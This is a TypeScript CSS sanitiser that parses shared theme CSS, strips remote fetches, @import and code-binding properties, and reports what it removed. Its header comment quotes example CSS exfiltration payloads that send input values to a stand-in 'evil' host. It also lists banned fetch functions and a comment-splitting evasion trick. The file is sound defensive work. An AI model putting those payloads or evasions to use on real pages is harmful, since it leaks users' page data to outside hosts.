// Sanitiser for custom CSS that arrives through a share (a `b2c-rice:` code or
// a theme file carrying `css`). Her own typed CSS is never passed through here.
//
// Threat: shared CSS that phones home. CSS can't run script, but any remote
// fetch it triggers can leak what's on her page, e.g.
//   input[value^="a"] { background: url(https://evil/a) }
//   [data-grade^="9"] { background: url(//evil/9) }
// So the invariant is: **the output references no URL except `data:`**. No
// remote url(), no @import, no remote @font-face source, no function that can
// take a URL as text (image-set(), image(), src(), cross-fade(), element(),
// expression(), and any function not on a short allowlist that is given a
// string). With no network sink, selectors can match anything they like.
//
// How: a CSS Syntax Level 3 tokenizer and parser (escapes, comments, url
// tokens, nesting) builds rules from the input; each rule is checked against
// an allowlist; the output is **re-serialised from tokens**, never copied from
// the input, so the browser parses exactly what was checked (comments are
// gone, escapes are normalised, and token boundaries get `/**/` separators
// where the spec requires them). Anything that doesn't parse cleanly (a bad
// string, a bad url, an unclosed block) drops its rule, and every removal is
// reported. A final pass re-tokenises the output and refuses everything if
// the invariant somehow doesn't hold.

/** Shared CSS limit (UTF-8 bytes of the input). Her own CSS has no limit here. */
export const SHARED_CSS_MAX = 32 * 1024;
/** Deeper nesting than this is dropped (nobody writes it; it only costs stack). */
const MAX_DEPTH = 16;

export interface Removed {
  /** The start of what was removed, as CSS (at most ~100 characters). */
  rule: string;
  /** Why, in plain words. */
  reason: string;
}

export interface SanitizeResult {
  /** The safe CSS (may be ''). */
  css: string;
  /** Everything taken out, in order. */
  removed: Removed[];
  /** Set when nothing could be used at all (too big, or failed the final check). */
  error?: string;
}

// ── Tokens ────────────────────────────────────────────────────────────────────

export type Tok =
  | { t: 'ident'; v: string }
  | { t: 'function'; v: string }
  | { t: 'at'; v: string }
  | { t: 'hash'; v: string }
  | { t: 'string'; v: string }
  | { t: 'url'; v: string }
  | { t: 'bad-string' }
  | { t: 'bad-url' }
  | { t: 'delim'; v: string }
  | { t: 'number'; repr: string }
  | { t: 'percentage'; repr: string }
  | { t: 'dimension'; repr: string; unit: string }
  | { t: 'ws' }
  | { t: 'cdo' }
  | { t: 'cdc' }
  | { t: ':' | ';' | ',' | '[' | ']' | '(' | ')' | '{' | '}' };

const isDigit = (c: string) => c >= '0' && c <= '9';
const isHex = (c: string) => isDigit(c) || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
const isLetter = (c: string) => (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z');
const isNameStart = (c: string) => c !== '' && (isLetter(c) || c === '_' || c.charCodeAt(0) >= 0x80);
const isName = (c: string) => isNameStart(c) || isDigit(c) || c === '-';
const isWs = (c: string) => c === ' ' || c === '\t' || c === '\n';
const isNonPrintable = (c: string) => {
  const n = c.charCodeAt(0);
  return n <= 0x08 || n === 0x0b || (n >= 0x0e && n <= 0x1f) || n === 0x7f;
};

/** CSS Syntax 3 §4: input → tokens. Never throws; parse errors become bad-* tokens. */
export function tokenize(input: string): Tok[] {
  // §3.3 preprocessing. Iterate by code point so astral characters stay whole.
  const s = Array.from(input.replace(/\r\n?|\f/g, '\n').replace(/\0/g, '�'));
  const out: Tok[] = [];
  let i = 0;
  const at = (k = 0) => s[i + k] ?? '';
  const validEscape = (a: string, b: string) => a === '\\' && b !== '\n' && b !== '';
  const startsIdent = (a: string, b: string, c: string) =>
    a === '-' ? isNameStart(b) || b === '-' || validEscape(b, c) : isNameStart(a) ? true : a === '\\' ? validEscape(a, b) : false;
  const startsNumber = (a: string, b: string, c: string) =>
    a === '+' || a === '-' ? isDigit(b) || (b === '.' && isDigit(c)) : a === '.' ? isDigit(b) : isDigit(a);

  const escaped = (): string => {
    // The backslash is already consumed.
    const c = at();
    if (c === '') return '�';
    i++;
    if (!isHex(c)) return c;
    let h = c;
    while (h.length < 6 && isHex(at())) h += s[i++];
    if (isWs(at())) i++;
    const n = parseInt(h, 16);
    return n === 0 || (n >= 0xd800 && n <= 0xdfff) || n > 0x10ffff ? '�' : String.fromCodePoint(n);
  };
  const name = (): string => {
    let r = '';
    for (;;) {
      const c = at();
      if (isName(c)) { r += c; i++; }
      else if (validEscape(c, at(1))) { i++; r += escaped(); }
      else return r;
    }
  };
  const number = (): string => {
    let r = '';
    if (at() === '+' || at() === '-') r += s[i++];
    while (isDigit(at())) r += s[i++];
    if (at() === '.' && isDigit(at(1))) { r += s[i++]; while (isDigit(at())) r += s[i++]; }
    if ((at() === 'e' || at() === 'E') && (isDigit(at(1)) || ((at(1) === '+' || at(1) === '-') && isDigit(at(2))))) {
      r += s[i++];
      if (at() === '+' || at() === '-') r += s[i++];
      while (isDigit(at())) r += s[i++];
    }
    return r;
  };
  const numeric = (): Tok => {
    const repr = number();
    if (startsIdent(at(), at(1), at(2))) return { t: 'dimension', repr, unit: name() };
    if (at() === '%') { i++; return { t: 'percentage', repr }; }
    return { t: 'number', repr };
  };
  const badUrlRest = () => {
    for (;;) {
      const c = at();
      if (c === '') return;
      i++;
      if (c === ')') return;
      if (validEscape(c, at())) escaped();
    }
  };
  const url = (): Tok => {
    let v = '';
    while (isWs(at())) i++;
    for (;;) {
      const c = at();
      if (c === '') return { t: 'url', v }; // parse error, but a url token
      i++;
      if (c === ')') return { t: 'url', v };
      if (isWs(c)) {
        while (isWs(at())) i++;
        if (at() === ')' || at() === '') { if (at() === ')') i++; return { t: 'url', v }; }
        badUrlRest();
        return { t: 'bad-url' };
      }
      if (c === '"' || c === "'" || c === '(' || isNonPrintable(c)) { badUrlRest(); return { t: 'bad-url' }; }
      if (c === '\\') {
        if (validEscape(c, at())) v += escaped();
        else { badUrlRest(); return { t: 'bad-url' }; }
        continue;
      }
      v += c;
    }
  };
  const identLike = (): Tok => {
    const v = name();
    if (v.toLowerCase() === 'url' && at() === '(') {
      i++;
      while (isWs(at()) && isWs(at(1))) i++;
      const a = at(), b = at(1);
      if (a === '"' || a === "'" || (isWs(a) && (b === '"' || b === "'"))) return { t: 'function', v };
      return url();
    }
    if (at() === '(') { i++; return { t: 'function', v }; }
    return { t: 'ident', v };
  };
  const string = (q: string): Tok => {
    let v = '';
    for (;;) {
      const c = at();
      if (c === '') return { t: 'string', v };
      i++;
      if (c === q) return { t: 'string', v };
      if (c === '\n') { i--; return { t: 'bad-string' }; }
      if (c === '\\') {
        if (at() === '') continue;
        if (at() === '\n') { i++; continue; }
        v += escaped();
        continue;
      }
      v += c;
    }
  };

  while (i < s.length) {
    const c = at();
    if (c === '/' && at(1) === '*') {
      i += 2;
      while (i < s.length && !(at() === '*' && at(1) === '/')) i++;
      i = Math.min(s.length, i + 2);
      continue;
    }
    if (isWs(c)) {
      while (isWs(at())) i++;
      out.push({ t: 'ws' });
      continue;
    }
    if (c === '"' || c === "'") { i++; out.push(string(c)); continue; }
    if (c === '#') {
      if (isName(at(1)) || validEscape(at(1), at(2))) { i++; out.push({ t: 'hash', v: name() }); }
      else { i++; out.push({ t: 'delim', v: '#' }); }
      continue;
    }
    if (c === '(' || c === ')' || c === ',' || c === ':' || c === ';' || c === '[' || c === ']' || c === '{' || c === '}') {
      i++;
      out.push({ t: c });
      continue;
    }
    if (c === '+' || c === '.') {
      if (startsNumber(c, at(1), at(2))) out.push(numeric());
      else { i++; out.push({ t: 'delim', v: c }); }
      continue;
    }
    if (c === '-') {
      if (startsNumber(c, at(1), at(2))) out.push(numeric());
      else if (at(1) === '-' && at(2) === '>') { i += 3; out.push({ t: 'cdc' }); }
      else if (startsIdent(c, at(1), at(2))) out.push(identLike());
      else { i++; out.push({ t: 'delim', v: c }); }
      continue;
    }
    if (c === '<') {
      if (at(1) === '!' && at(2) === '-' && at(3) === '-') { i += 4; out.push({ t: 'cdo' }); }
      else { i++; out.push({ t: 'delim', v: c }); }
      continue;
    }
    if (c === '@') {
      i++;
      if (startsIdent(at(), at(1), at(2))) out.push({ t: 'at', v: name() });
      else out.push({ t: 'delim', v: '@' });
      continue;
    }
    if (c === '\\') {
      if (validEscape(c, at(1))) out.push(identLike());
      else { i++; out.push({ t: 'delim', v: '\\' }); }
      continue;
    }
    if (isDigit(c)) { out.push(numeric()); continue; }
    if (isNameStart(c)) { out.push(identLike()); continue; }
    i++;
    out.push({ t: 'delim', v: c });
  }
  return out;
}

// ── Serialisation (CSSOM "serialize an identifier/string" + Syntax §9.1) ──────

const hexEsc = (c: string) => `\\${c.codePointAt(0)!.toString(16)} `;

export function serializeIdent(v: string): string {
  const cs = Array.from(v);
  if (cs.length === 1 && cs[0] === '-') return '\\-';
  let r = '';
  cs.forEach((c, k) => {
    const n = c.codePointAt(0)!;
    if (n === 0) r += '�';
    else if ((n >= 1 && n <= 0x1f) || n === 0x7f) r += hexEsc(c);
    else if ((k === 0 && isDigit(c)) || (k === 1 && isDigit(c) && cs[0] === '-')) r += hexEsc(c);
    else if (isName(c)) r += c;
    else r += '\\' + c;
  });
  return r;
}

/** Like an identifier, but may start with a digit (hash names, e.g. `#123abc`). */
function serializeName(v: string): string {
  let r = '';
  for (const c of v) {
    const n = c.codePointAt(0)!;
    if ((n >= 1 && n <= 0x1f) || n === 0x7f) r += hexEsc(c);
    else if (isName(c)) r += c;
    else r += '\\' + c;
  }
  return r;
}

export function serializeString(v: string): string {
  let r = '"';
  for (const c of v) {
    const n = c.codePointAt(0)!;
    if (n === 0) r += '�';
    else if ((n >= 1 && n <= 0x1f) || n === 0x7f || c === '<' || c === '>') r += hexEsc(c); // < > never reach a <style> parser raw
    else if (c === '"' || c === '\\') r += '\\' + c;
    else r += c;
  }
  return r + '"';
}

function tokText(k: Tok): string {
  switch (k.t) {
    case 'ident': return serializeIdent(k.v);
    case 'function': return serializeIdent(k.v) + '(';
    case 'at': return '@' + serializeIdent(k.v);
    case 'hash': return '#' + serializeName(k.v);
    case 'string': return serializeString(k.v);
    case 'url': return `url(${serializeString(k.v)})`;
    case 'delim': return k.v === '\\' ? '' : k.v;
    case 'number': return k.repr;
    case 'percentage': return k.repr + '%';
    case 'dimension': {
      // A unit like "e3" would re-read as an exponent: escape its first letter.
      const u = serializeIdent(k.unit);
      return k.repr + (/^[eE]-?\d/.test(k.unit) ? hexEsc(k.unit[0]!) + u.slice(1) : u);
    }
    case 'ws': return ' ';
    case 'cdo': case 'cdc': case 'bad-string': case 'bad-url': return '';
    default: return k.t;
  }
}

const kindOf = (k: Tok) => (k.t === 'delim' ? 'd' + k.v : k.t);
const IDENTISH = ['ident', 'function', 'url', 'bad-url', 'd-', 'number', 'percentage', 'dimension', 'cdc'];
const NEEDS_SEP: Record<string, string[]> = {
  ident: [...IDENTISH, '('],
  at: IDENTISH, hash: IDENTISH, dimension: IDENTISH,
  'd#': IDENTISH.filter(x => x !== 'cdc'),
  'd-': IDENTISH.filter(x => x !== 'cdc'),
  number: ['ident', 'function', 'url', 'bad-url', 'number', 'percentage', 'dimension', 'd%'],
  'd@': ['ident', 'function', 'url', 'bad-url', 'd-', 'cdc'],
  'd.': ['number', 'percentage', 'dimension'],
  'd+': ['number', 'percentage', 'dimension'],
  'd/': ['d*'],
  'd<': ['d!'],
};

/** Tokens → CSS text, with `/**\/` where two tokens would otherwise merge. */
export function serializeTokens(ts: readonly Tok[]): string {
  let r = '';
  let prev: Tok | null = null;
  for (const k of ts) {
    if (prev && NEEDS_SEP[kindOf(prev)]?.includes(kindOf(k))) r += '/**/';
    r += tokText(k);
    prev = k;
  }
  return r;
}

// ── Parser (Syntax §5, with nesting) ──────────────────────────────────────────

type Item =
  | { kind: 'rule'; prelude: Tok[]; block: Item[] }
  | { kind: 'at'; name: string; prelude: Tok[]; block: Item[] | null }
  | { kind: 'decl'; name: string; value: Tok[] }
  | { kind: 'error'; tokens: Tok[]; reason: string };

const CLOSER: Record<string, string> = { '{': '}', '[': ']', '(': ')', function: ')' };

class Parser {
  i = 0;
  readonly ts: Tok[];
  readonly end: number;
  constructor(ts: Tok[], end = ts.length) {
    this.ts = ts;
    this.end = end;
  }
  peek() { return this.i < this.end ? this.ts[this.i]! : null; }
  /**
   * The component value starting at i: one token, or a whole block for an
   * opener. A closer that doesn't match the innermost opener is an ordinary
   * token, as in the spec.
   */
  component(i: number): { next: number; closed: boolean } {
    const first = CLOSER[this.ts[i]!.t];
    if (!first) return { next: i + 1, closed: true };
    const stack = [first];
    for (let j = i + 1; j < this.end; j++) {
      const t = this.ts[j]!.t;
      const c = CLOSER[t];
      if (c) stack.push(c);
      else if (t === stack[stack.length - 1]) {
        stack.pop();
        if (!stack.length) return { next: j + 1, closed: true };
      }
    }
    return { next: this.end, closed: false };
  }
  /** Parse the inside of the {} block at i with `fn`, and move past it. */
  block<T>(i: number, fn: (p: Parser) => T): { value: T; closed: boolean } {
    const { next, closed } = this.component(i);
    const sub = new Parser(this.ts, closed ? next - 1 : next);
    sub.i = i + 1;
    this.i = next;
    return { value: fn(sub), closed };
  }

  /** A list of rules (stylesheet top level). */
  ruleList(): Item[] {
    const out: Item[] = [];
    while (this.i < this.end) {
      const k = this.peek()!;
      if (k.t === 'ws' || k.t === 'cdo' || k.t === 'cdc') { this.i++; continue; }
      out.push(k.t === 'at' ? this.atRule(false) : this.qualified(false));
    }
    return out;
  }

  /** A block's contents: declarations, nested rules and at-rules. */
  blockContents(): Item[] {
    const out: Item[] = [];
    while (this.i < this.end) {
      const k = this.peek()!;
      if (k.t === 'ws' || k.t === ';') { this.i++; continue; }
      if (k.t === 'at') { out.push(this.atRule(true)); continue; }
      const start = this.i;
      const d = this.declaration();
      if (d) { out.push(d); continue; }
      this.i = start;
      out.push(this.qualified(true));
    }
    return out;
  }

  /** A declaration, or null (and i unchanged) when this is really a nested rule. */
  declaration(): Item | null {
    const start = this.i;
    const k = this.peek()!;
    if (k.t !== 'ident') return null;
    this.i++;
    while (this.peek()?.t === 'ws') this.i++;
    if (this.peek()?.t !== ':') { this.i = start; return null; }
    this.i++;
    const value: Tok[] = [];
    let unclosed = false, hasBlock = false, hasOther = false;
    while (this.i < this.end && this.peek()!.t !== ';') {
      const t = this.peek()!.t;
      const { next, closed } = this.component(this.i);
      if (!closed) unclosed = true;
      if (t === '{') hasBlock = true;
      else if (t !== 'ws') hasOther = true;
      for (let x = this.i; x < next; x++) value.push(this.ts[x]!);
      this.i = next;
    }
    const name = k.v;
    // A {} block next to anything else means a nested rule (`a:hover { … }`).
    if (hasBlock && hasOther && !name.startsWith('--')) { this.i = start; return null; }
    if (this.peek()?.t === ';') this.i++;
    if (unclosed) return { kind: 'error', tokens: this.ts.slice(start, this.i), reason: 'An unclosed bracket. The declaration was dropped.' };
    return { kind: 'decl', name, value: trim(value) };
  }

  qualified(nested: boolean): Item {
    const start = this.i;
    const prelude: Tok[] = [];
    while (this.i < this.end) {
      const k = this.peek()!;
      if (k.t === '{') {
        const { value, closed } = this.block(this.i, p => p.blockContents());
        if (!closed) return { kind: 'error', tokens: this.ts.slice(start, this.i), reason: 'An unclosed block. The rule was dropped.' };
        return { kind: 'rule', prelude, block: value };
      }
      if (nested && k.t === ';') {
        this.i++;
        return { kind: 'error', tokens: this.ts.slice(start, this.i), reason: "This couldn't be read as CSS. It was dropped." };
      }
      const { next } = this.component(this.i);
      for (let x = this.i; x < next; x++) prelude.push(this.ts[x]!);
      this.i = next;
    }
    return { kind: 'error', tokens: this.ts.slice(start, this.i), reason: 'A selector with no { } block. It was dropped.' };
  }

  atRule(nested: boolean): Item {
    const start = this.i;
    const name = (this.peek() as { v: string }).v;
    this.i++;
    const prelude: Tok[] = [];
    while (this.i < this.end) {
      const k = this.peek()!;
      if (k.t === ';') { this.i++; return { kind: 'at', name, prelude, block: null }; }
      if (k.t === '{') {
        const { value, closed } = this.block(this.i, p => p.blockContents());
        if (!closed) return { kind: 'error', tokens: this.ts.slice(start, this.i), reason: 'An unclosed block. The rule was dropped.' };
        return { kind: 'at', name, prelude, block: value };
      }
      if (nested && k.t === '}') break;
      const { next } = this.component(this.i);
      for (let x = this.i; x < next; x++) prelude.push(this.ts[x]!);
      this.i = next;
    }
    return { kind: 'at', name, prelude, block: null };
  }
}

// ── Policy ────────────────────────────────────────────────────────────────────

/** At-rules whose body is a list of rules. */
const GROUP_AT = new Set(['media', 'supports', 'layer', 'container', 'scope', 'starting-style']);
/** At-rules whose body is declarations only. */
const DECL_AT = new Set(['font-face', 'property', 'counter-style', 'page']);
const KEYFRAMES_AT = new Set(['keyframes', '-webkit-keyframes']);

/** Functions that can fetch, or run code. Never allowed. */
const BANNED_FN = new Set([
  'image', 'image-set', '-webkit-image-set', 'cross-fade', '-webkit-cross-fade', 'element', '-moz-element',
  'src', 'expression', 'paint', '-webkit-canvas',
]);
/** Functions that may take a quoted string (none of them fetch). */
const STRING_OK_FN = new Set(['local', 'format', 'tech', 'counter', 'counters', 'var', 'env', 'symbols', 'string', 'attr', 'content', 'selector', 'font-tech', 'font-format']);
/** Properties that bind behaviour (old IE/Firefox). */
const BANNED_PROP = new Set(['behavior', '-moz-binding']);
/** Idents that would be a fetch if a ( followed: `url/**\/(x)` is plain text, but say so. */
const URLISH = new Set(['url', ...BANNED_FN]);

export const isDataUrl = (v: string) => /^data:/i.test(v.trim());

const short = (s: string) => {
  const one = s.replace(/\s+/g, ' ').trim();
  return one.length > 100 ? one.slice(0, 97) + '…' : one;
};
const hostOf = (u: string) => {
  const m = /^\s*(?:[a-z][a-z0-9+.-]*:)?\/\/([^/?#\s]*)/i.exec(u);
  return m?.[1] ? ` (${m[1]})` : '';
};

/**
 * Why these tokens aren't safe, or null. `where` says what they are: a
 * selector (text in it is harmless), an at-rule prelude, or a declaration
 * value for property `prop` (attr() is fine only inside `content`).
 */
function unsafe(ts: readonly Tok[], where: 'selector' | 'prelude' | 'value', prop = ''): string | null {
  const stack: string[] = []; // open brackets: the function name, or '' for ( [ {
  for (let k = 0; k < ts.length; k++) {
    const x = ts[k]!;
    switch (x.t) {
      case 'bad-url': return "A web address that couldn't be read. Shared CSS can't load anything from the internet.";
      case 'bad-string': return "Text with no closing quote, so it couldn't be read safely.";
      case 'url':
        if (!isDataUrl(x.v)) return `A url() that loads a file from the internet${hostOf(x.v)}. Shared CSS can only use images built into the CSS (data: addresses).`;
        break;
      case 'delim':
        if (x.v === '\\') return "A stray backslash, so this couldn't be read safely.";
        break;
      case 'ident': {
        const name = x.v.toLowerCase();
        if (URLISH.has(name)) {
          let j = k + 1;
          while (ts[j]?.t === 'ws') j++;
          if (ts[j]?.t === '(') return `"${name}" then a bracket, split by a comment or a space: a known way to sneak a web address past a filter.`;
        }
        break;
      }
      case 'function': {
        const name = x.v.toLowerCase();
        if (BANNED_FN.has(name)) return `${name}() can load files from the internet or run code, so it isn't allowed in shared CSS.`;
        if (name === 'attr' && where === 'value' && prop !== 'content') return 'attr() outside `content` could turn page text into a web address.';
        if (name === 'url') {
          // url("…"): exactly one quoted address, and only data:.
          const args: Tok[] = [];
          let j = k + 1;
          for (; j < ts.length && ts[j]!.t !== ')'; j++) if (ts[j]!.t !== 'ws') args.push(ts[j]!);
          const a = args[0];
          if (j >= ts.length || args.length !== 1 || a?.t !== 'string') return 'A url() with something other than one plain address in it.';
          if (!isDataUrl(a.v)) return `A url() that loads a file from the internet${hostOf(a.v)}. Shared CSS can only use images built into the CSS (data: addresses).`;
          k = j; // its ) is consumed here
          break;
        }
        stack.push(name);
        break;
      }
      case '(': case '[': case '{': stack.push(''); break;
      case ')': case ']': case '}':
        if (!stack.length) return 'A closing bracket with no opening one.';
        stack.pop();
        break;
      case 'string':
        if (where !== 'selector') {
          const fn = stack.find(f => f !== '' && !STRING_OK_FN.has(f));
          if (fn !== undefined) return `Text inside ${fn}() could be a web address, so it isn't allowed in shared CSS.`;
        }
        break;
    }
  }
  return null;
}

type Ctx = 'top' | 'group' | 'style' | 'decls' | 'keyframes';

class Sanitizer {
  removed: Removed[] = [];
  drop(tokens: Tok[] | string, reason: string) {
    this.removed.push({ rule: short(typeof tokens === 'string' ? tokens : serializeTokens(tokens)), reason });
  }

  items(list: Item[], ctx: Ctx, depth: number, indent: string): string[] {
    const out: string[] = [];
    for (const it of list) {
      const s = this.item(it, ctx, depth, indent);
      if (s) out.push(s);
    }
    return out;
  }

  item(it: Item, ctx: Ctx, depth: number, indent: string): string | null {
    if (it.kind === 'error') { this.drop(it.tokens, it.reason); return null; }
    if (it.kind === 'decl') return this.decl(it, ctx, indent);
    if (depth >= MAX_DEPTH) { this.drop(it.kind === 'rule' ? it.prelude : '@' + it.name, 'Nested too deeply.'); return null; }
    if (it.kind === 'rule') {
      if (ctx === 'decls') { this.drop([...it.prelude, { t: '{' }], 'A nested rule where only properties are allowed.'); return null; }
      const why = unsafe(it.prelude, 'selector');
      const prelude = serializeTokens(trim(it.prelude));
      if (why) { this.drop(prelude, why); return null; }
      if (!prelude) { this.drop('{…}', 'A rule with no selector.'); return null; }
      const inner = this.items(it.block, ctx === 'keyframes' ? 'decls' : 'style', depth + 1, indent + '  ');
      if (!inner.length) return null; // nothing left (or nothing there): an empty rule does nothing
      return `${indent}${prelude} {\n${inner.join('\n')}\n${indent}}`;
    }
    // at-rule
    const name = it.name.toLowerCase();
    const head = `@${serializeIdent(it.name)}${it.prelude.length ? ' ' + serializeTokens(trim(it.prelude)) : ''}`;
    if (name === 'import') { this.drop(head, '@import loads another stylesheet from the internet.'); return null; }
    if (name === 'namespace') { this.drop(head, '@namespace can point at a web address and changes how selectors read.'); return null; }
    if (name === 'charset') { this.drop(head, '@charset does nothing in shared CSS.'); return null; }
    const why = unsafe(it.prelude, 'prelude');
    if (why) { this.drop(head, why); return null; }
    const allowedHere =
      ctx === 'top' || ctx === 'group' ? GROUP_AT.has(name) || DECL_AT.has(name) || KEYFRAMES_AT.has(name)
      : ctx === 'style' ? GROUP_AT.has(name)
      : false;
    if (!allowedHere) { this.drop(head, `@${name} isn't allowed in shared CSS${ctx === 'decls' || ctx === 'keyframes' ? ' here' : ''}.`); return null; }
    if (!it.block) {
      if (name === 'layer') return `${indent}${head};`;
      this.drop(head, `@${name} without a { } block.`);
      return null;
    }
    const inner = DECL_AT.has(name) ? 'decls' : KEYFRAMES_AT.has(name) ? 'keyframes' : ctx === 'style' ? 'style' : 'group';
    const body = this.items(it.block, inner, depth + 1, indent + '  ');
    if (name === 'font-face' && !body.some(l => /^\s*src:/i.test(l))) {
      this.drop(head, '@font-face without a font built into the CSS. Shared CSS can use b²c\'s fonts by name, or data: fonts.');
      return null;
    }
    if (!body.length) return null;
    return `${indent}${head} {\n${body.join('\n')}\n${indent}}`;
  }

  decl(d: Extract<Item, { kind: 'decl' }>, ctx: Ctx, indent: string): string | null {
    const prop = d.name.toLowerCase();
    const text = `${serializeIdent(d.name)}: ${serializeTokens(d.value)}`;
    if (ctx === 'top' || ctx === 'group' || ctx === 'keyframes') { this.drop(text, 'A property outside any rule.'); return null; }
    if (BANNED_PROP.has(prop)) { this.drop(text, `${prop} can run code, so it isn't allowed.`); return null; }
    const why = unsafe(d.value, 'value', prop);
    if (why) { this.drop(text, why); return null; }
    return `${indent}${serializeIdent(d.name)}: ${serializeTokens(d.value)};`;
  }
}

function trim(ts: Tok[]): Tok[] {
  let a = 0, b = ts.length;
  while (a < b && ts[a]!.t === 'ws') a++;
  while (b > a && ts[b - 1]!.t === 'ws') b--;
  return ts.slice(a, b);
}

/** True when CSS text references nothing but data: URLs and no fetching function or at-rule. */
export function isSafeCss(css: string): boolean {
  const ts = tokenize(css);
  for (let k = 0; k < ts.length; k++) {
    const x = ts[k]!;
    if (x.t === 'bad-url') return false;
    if (x.t === 'url' && !isDataUrl(x.v)) return false;
    if (x.t === 'at' && ['import', 'namespace'].includes(x.v.toLowerCase())) return false;
    if (x.t === 'function') {
      const n = x.v.toLowerCase();
      if (BANNED_FN.has(n)) return false;
      if (n === 'url') {
        let j = k + 1;
        while (ts[j]?.t === 'ws') j++;
        const a = ts[j];
        if (a?.t !== 'string' || !isDataUrl(a.v)) return false;
      }
    }
  }
  return true;
}

/**
 * Make shared CSS safe to apply. Returns the CSS to store (in custom-css.css)
 * and a list of what was removed and why, for the Studio's import preview.
 */
export function sanitizeCss(input: string): SanitizeResult {
  const bytes = new TextEncoder().encode(input).length;
  if (bytes > SHARED_CSS_MAX) {
    const kb = (n: number) => `${Math.ceil(n / 1024)} KB`;
    return { css: '', removed: [], error: `This theme's custom CSS is ${kb(bytes)}. Shared CSS can be at most ${kb(SHARED_CSS_MAX)}, so it wasn't used.` };
  }
  const tree = new Parser(tokenize(input)).ruleList();
  const s = new Sanitizer();
  const css = s.items(tree, 'top', 0, '').join('\n');
  // Belt and braces: the output must pass on its own, re-read from scratch.
  if (!isSafeCss(css)) return { css: '', removed: s.removed, error: "This CSS couldn't be made safe, so none of it was used." };
  return { css: css ? css + '\n' : '', removed: s.removed };
}
